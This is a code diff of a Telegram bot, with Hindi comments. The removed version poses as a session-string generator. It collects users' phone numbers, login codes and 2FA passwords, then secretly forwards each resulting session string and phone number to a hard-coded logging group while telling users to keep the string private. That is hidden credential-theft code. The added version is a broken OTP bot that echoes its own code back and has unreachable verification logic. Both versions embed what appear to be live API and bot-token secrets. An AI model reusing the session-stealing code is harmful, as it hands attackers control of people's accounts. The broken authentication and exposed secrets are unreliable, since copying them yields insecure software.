@@ -1,169 +1,97 @@
-import asyncio
-from pyrogram.errors import PhoneCodeExpired, PhoneCodeInvalid, SessionPasswordNeeded
-from pyrogram.types import Message
-from pyrogram import Client, filters, StringSession
-from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
+import random
+import time
+import logging
 
+# Telegram API ID और API Hash (अपनी जानकारी यहाँ डालें)
+API_ID = '28795512'  # यहाँ अपना API ID डालें
+API_HASH = 'c17e4eb6d994c9892b8a8b6bfea4042a'  # यहाँ अपना API Hash डालें
 
+# Bot Token (अपना बॉट टोकन यहाँ डालें)
+BOT_TOKEN = '7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA'
 
-# Telegram API Credentials
-API_ID = 28795512
-API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
-BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"
+# OTP वेरिफिकेशन के लिए इन-मेमोरी स्टोर
+otp_store = {}
 
-# Logger Group ID (Replace with your Telegram Group ID)
-LOGGER_GROUP_ID = -1002477750706
+# Logging सेटअप
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+                    level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-# Initialize the bot
-bot = Client("bot", API_ID, API_HASH, bot_token=BOT_TOKEN)
+# OTP जनरेट करने का फंक्शन (अब 5 अंकों का OTP जनरेट करेगा)
+def generate_otp() -> str:
+    return str(random.randint(10000, 99999))  # 5-digit OTP
 
-# Store user sessions
-user_sessions = {}
+# OTP भेजने के लिए कमांड
+def start(update: Update, context: CallbackContext) -> None:
+    update.message.reply_text("Welcome! Please send your phone number in this format: +<country_code><number>")
 
-# Start Command with Image & Buttons
-@bot.on_message(filters.command("start"))
-async def start(client, message: Message):
-    await message.reply(
-        "┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼ ⏤͟͟͞͞‌‌‌‌★\n"
-        "**┆◍ нᴇʏ, ᴍʏ ᴅᴇᴀʀ ᴜsᴇʀ 💐!\n"
-        "┆● ɴɪᴄᴇ ᴛᴏ ᴍᴇᴇᴛ ʏᴏᴜ !\n"
-        "└─────────────────────────•\n"
-        "❖ ɪ ᴀᴍ ᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴇ ʙᴏᴛ**\n"
-        "❖ ʏᴏᴜ ᴄᴀɴ ᴜsᴇ ᴍᴇ ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ**\n"
-        "❖ sᴜᴘᴘᴏʀᴛ - ᴘʏʀᴏɢʀᴀᴍ | ᴛᴇʟᴇᴛʜᴏɴ\n"
-        "•─────────────────────────•\n"
-        "❖ ʙʏ : sᴀɴᴀᴛᴀɴɪ ᴛᴇᴄʜ | sᴀɴᴀᴛᴀɴɪ ᴄʜᴀᴛ\n"
-        "•─────────────────────────•", 
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🍁 ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ 🍁", callback_data="generate")],
-            [InlineKeyboardButton("🍷 sᴜᴘᴘᴏʀᴛ", url="https://t.me/SANATANI_SUPPORT"), 
-             InlineKeyboardButton("ᴜᴘᴅᴀᴛᴇs 🍸", url="https://t.me/SANATANI_TECH")],
-            [InlineKeyboardButton("🔍 ʜᴇʟᴘ ᴍᴇɴᴜ 🔎", callback_data="help")]
-        ])
-    )
+# OTP जनरेट और वेरिफिकेशन
+def send_otp(update: Update, context: CallbackContext) -> None:
+    phone_number = update.message.text.strip()
 
+    if phone_number.startswith('+'):
+        # OTP जनरेट करें और भेजें
+        otp = generate_otp()
+        otp_store[phone_number] = {
+            'otp': otp,
+            'time': time.time()  # OTP एक्सपायरी टाइम
+        }
 
-# Help Command Handler
-@bot.on_callback_query(filters.regex(b"help"))
-async def send_help(client, callback_query):
-    help_text = """ 
-    ❖ ʜᴏᴡ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ?
+        # OTP को उपयोगकर्ता को भेजें
+        update.message.reply_text(f"Your OTP is: {otp}\nPlease enter it to verify.")
 
-    ◍ ᴄʟɪᴄᴋ ᴏɴ ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ ᴏʀ ᴛʏᴘᴇ /generate
-    ◍ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ, • ᴇxᴀᴍᴘʟᴇ : +919876543210 
-    ◍ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ ʀᴇᴄᴇɪᴠᴇᴅ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ
-    ◍ ɪғ ᴀsᴋᴇᴅ, ᴇɴᴛᴇʀ ʏᴏᴜʀ 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴘᴀssᴡᴏʀᴅ
-    ◍ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ ᴡɪʟʟ ʙᴇ ɢᴇɴᴇʀᴀᴛᴇᴅ !
-    ◍ ᴋᴇᴇᴘ ʏᴏᴜʀ session sᴀғᴇ & sᴇᴄᴜʀᴇ. ᴅᴏɴ'ᴛ sʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ
-
-    ❖ ɪғ ʏᴏᴜ ғᴀᴄᴇ ᴀɴʏ ɪssᴜᴇs, ᴜsᴇ /cancel ᴛᴏ ʀᴇsᴇᴛ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ
-    """
-    await callback_query.message.reply(help_text, reply_markup=InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔙 Back", callback_data="start")]
-    ]))
-
-
-# Cancel Command Handler
-@bot.on_message(filters.command("cancel"))
-async def cancel_command(client, message: Message):
-    await cancel_session(client, message)
-
-
-# Cancel Button Handler
-@bot.on_callback_query(filters.regex(b"cancel"))
-async def cancel_button(client, callback_query):
-    await cancel_session(client, callback_query.message)
-
-
-# Function to Cancel the Process
-async def cancel_session(client, message: Message):
-    user_id = message.from_user.id
-    if user_id in user_sessions:
-        del user_sessions[user_id]  # Remove user session
-        await message.reply("❖ ʏᴏᴜʀ sᴇssɪᴏɴ ᴘʀᴏᴄᴇss ʜᴀs ʙᴇᴇɴ ᴄᴀɴᴄᴇʟᴇᴅ !\n◍ ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴀɢᴀɪɴ ᴡɪᴛʜ /generate")
     else:
-        await message.reply("❖ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ ᴀɴʏ sᴇssɪᴏɴ ᴘʀᴏᴄᴇss")
+        update.message.reply_text("Please enter a valid phone number in the format: +<country_code><number>")
 
+# OTP वेरीफाई करने के लिए फंक्शन
+def verify_otp(update: Update, context: CallbackContext) -> None:
+    user_input_otp = update.message.text.strip()
+    phone_number = context.user_data.get('phone_number', None)
 
-# Generate Session Command
-@bot.on_callback_query(filters.regex(b"generate"))
-async def ask_phone(client, callback_query):
-    user_id = callback_query.from_user.id
-    user_sessions[user_id] = {"step": "phone"}
-    await callback_query.message.reply(
-        "❖ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ\n\n◍ ᴇxᴘʟᴀɪɴ :** +919876543210**", 
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
-        ])
-    )
+    if phone_number and phone_number in otp_store:
+        stored_otp_data = otp_store[phone_number]
+        stored_otp = stored_otp_data['otp']
+        otp_time = stored_otp_data['time']
 
+        # 5 मिनट तक वैलिड OTP चेक करें
+        if time.time() - otp_time < 300:
+            if user_input_otp == stored_otp:
+                update.message.reply_text("OTP verified successfully! You are now authenticated.")
+                del otp_store[phone_number]  # OTP को समाप्त करें
+            else:
+                update.message.reply_text("Invalid OTP. Please try again.")
+        else:
+            update.message.reply_text("OTP expired. Please request a new OTP.")
+            del otp_store[phone_number]  # OTP को समाप्त करें
+    else:
+        update.message.reply_text("Please enter your phone number first by typing: +<country_code><number>")
 
-# Process User Input
-@bot.on_message(filters.text)
-async def process_input(client, message: Message):
-    user_id = message.from_user.id
-    if user_id not in user_sessions:
-        return
+# OTP वेरिफिकेशन के लिए वेरिफाई कमांड
+def verify(update: Update, context: CallbackContext) -> None:
+    update.message.reply_text("Please send the OTP you received after submitting your phone number.")
 
-    step = user_sessions[user_id]["step"]
+# Main function to start the bot
+def main() -> None:
+    """Start the bot."""
+    updater = Updater(BOT_TOKEN)
 
-    # ✅ Step 1: Enter Phone Number
-    if step == "phone":
-        phone_number = message.text.strip()
-        user_sessions[user_id]["phone"] = phone_number
+    dispatcher = updater.dispatcher
 
-        async with Client(StringSession(), API_ID, API_HASH) as client_session:
-            user_sessions[user_id]["client"] = client_session
+    # बॉट के कमांड्स जोड़ें
+    dispatcher.add_handler(CommandHandler("start", start))
+    dispatcher.add_handler(CommandHandler("verify", verify))
 
-            try:
-                sent_code = await client_session.send_code_request(phone_number)
-                user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Save hash
-                user_sessions[user_id]["step"] = "otp"
-                await message.reply(
-                    "**❖ ᴏᴛᴘ sᴇɴᴛ ! ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ ʀᴇᴄᴇɪᴠᴇᴅ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ !**",
-                    reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
-                    ])
-                )
-            except Exception as e:
-                await message.reply(f"**❖ ᴇʀʀᴏʀ:** {str(e)}. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ !")
-                del user_sessions[user_id]
+    # यूज़र द्वारा फोन नंबर भेजने पर OTP जनरेट करने के लिए
+    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, send_otp))
 
-    # ✅ Step 2: Enter OTP
-    elif step == "otp":
-        otp_code = message.text.strip()
-        client = user_sessions[user_id]["client"]
-        phone_number = user_sessions[user_id]["phone"]
-        phone_code_hash = user_sessions[user_id].get("phone_code_hash")  # Retrieve hash
+    # OTP वेरिफिकेशन के लिए
+    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, verify_otp))
 
-        try:
-            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
-            session_string = client.session.save()
+    # बॉट को शुरू करें
+    updater.start_polling()
+    updater.idle()
 
-            await bot.send_message(LOGGER_GROUP_ID, f"**❖ New Session Generated !**\n\n**◍ ᴜsᴇʀ:** `{user_id}`\n**◍ ᴘʜᴏɴᴇ:** `{phone_number}`\n**◍ sᴇssɪᴏɴ:** `{session_string}`")
-
-            await message.reply(f"**❖ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ :**\n\n❖ `{session_string}`\n\n**◍ ᴋᴇᴇᴘ ᴛʜɪs sᴀғᴇ !**")
-            del user_sessions[user_id]
-
-        except PhoneCodeExpired:
-            await message.reply("**❖ ᴇʀʀᴏʀ : ᴛʜᴇ ᴏᴛᴘ ʜᴀs ᴇxᴘɪʀᴇᴅ. ᴘʟᴇᴀsᴇ ᴜsᴇ /generate ᴛᴏ ɢᴇᴛ ᴀ ɴᴇᴡ ᴏᴛᴘ**")
-            del user_sessions[user_id]
-
-        except PhoneCodeInvalid:
-            await message.reply("**❖ ᴇʀʀᴏʀ : ᴛʜᴇ ᴏᴛᴘ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ**")
-
-        except SessionPasswordNeeded:
-            user_sessions[user_id]["step"] = "password"
-            await message.reply(
-                "**❖ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ.**\n◍ ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴘᴀssᴡᴏʀᴅ :",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
-                ])
-            )
-
-        except Exception as e:
-            await message.reply(f"**❖ ᴇʀʀᴏʀ :** {str(e)}. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ")
-            del user_sessions[user_id]
-
-# Running the Bot
-bot.run()
+if __name__ == '__main__':
+    main()
